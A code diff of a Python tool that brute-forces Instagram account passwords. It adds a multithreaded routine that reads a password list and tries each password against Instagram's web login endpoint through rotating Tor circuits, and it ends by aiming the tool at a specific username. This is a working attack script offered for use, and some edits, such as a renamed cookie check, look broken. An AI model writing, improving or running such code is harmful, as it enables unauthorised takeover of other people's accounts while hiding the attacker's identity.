@@ -5,8 +5,9 @@ from shutil import which
 from stem.control import Controller
 from stem import Signal
 import requests
-from bs4 import BeautifulSoup
 import json
+import _thread 
+import time 
 
 class Tor(): 
     """
@@ -58,6 +59,11 @@ class Instagram():
     """
     Instagram controller
     """
+    
+    current_trying = ""
+    tested_passwords = 0 
+    ended =0
+
     def __init__(self,username,use_tor=None):
         self.use_tor = use_tor
         self.username = username
@@ -83,17 +89,46 @@ class Instagram():
     def ipaddr(self) -> str:
         return self.session.get("https://httpbin.org/ip").json()["origin"]
 
-    def split_passwords(self,passwords,nof) -> list:
-        chunk_size = len(passwords)//nof
+    def split_passwords(self,passwords,noft) -> list:
+        chunk_size = len(passwords)//noft
         if chunk_size > 0:
             return [passwords[i:i + chunk_size] for i in range(0,len(passwords),chunk_size)]
         else:
-            return passwords
+            return [passwords]
+
+    def bruteforce(self, threads, passlist):
+        with open(passlist,"r") as file:
+            passwords = file.read()
+        temp =  self.split_passwords(passwords.split("\n"),threads)
+        for passwords_ in temp:
+            _thread.start_new_thread(lambda : self.try_passwords(passwords_), ())
+        while True:
+            os.system("clear")
+            print("\rCurrent Trying : {}\n Total Tried : {}".format(self.current_trying, self.tested_passwords),end="")
+            time.sleep(0.1)
+            if self.ended == len(temp):
+                os.system("clear")
+                exit("Bad luck")
+
+    def try_passwords(self, passwords):
+        for password in passwords:
+            if password == "\n":
+                continue
+            self.current_trying = password
+            def test(passw):
+                try_ = self.login(passw)
+                if try_["message"] != "Sorry, your password was incorrect. Please double-check your password.":
+                    print(try_)
+                    exit()
+
+            test(password)
+            self.tested_passwords += 1 
+        self.ended += 1
 
     def get_cookies(self):
         self.session.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/",headers=self.head_pre) 
         cookies = self.session.cookies.get_dict()
-        if "csrftoken" in cookies.keys():
+        if "csrftoken1" in cookies.keys():
             with open(".cookie","w") as file:
                 file.write(str(cookies).replace("'",'"'))
                 file.close
@@ -125,7 +160,7 @@ class Instagram():
             "TE": "trailers",
         }
 
-    def login(self,password) -> bool:
+    def login(self,password) -> dict:
         if self.use_tor is not None:
             self.session.proxies = self.use_tor.proxy()
         url = "https://i.instagram.com/api/v1/web/accounts/login/ajax/"
@@ -135,12 +170,11 @@ class Instagram():
             'queryParams': '{}',
             'optIntoOneTap': 'false'
         }
-        self.session.cookies.clear()
+        #self.session.cookies.clear()
         head_post = self.get_universal_headers()
-        print(self.session.post(url,data = data,headers=head_post).text)
-        return False
+        return  self.session.post(url,data = data,headers=head_post, cookies=self.session.cookies).json()
 
 tor = Tor(9876,4949)
 tor.start()
-ig = Instagram("tdynamos.linux",use_tor=tor)
-ig.login("sometest")
+ig = Instagram("Oxbridge_hub",use_tor=tor)
+ig.bruteforce(3, "test.passlist")
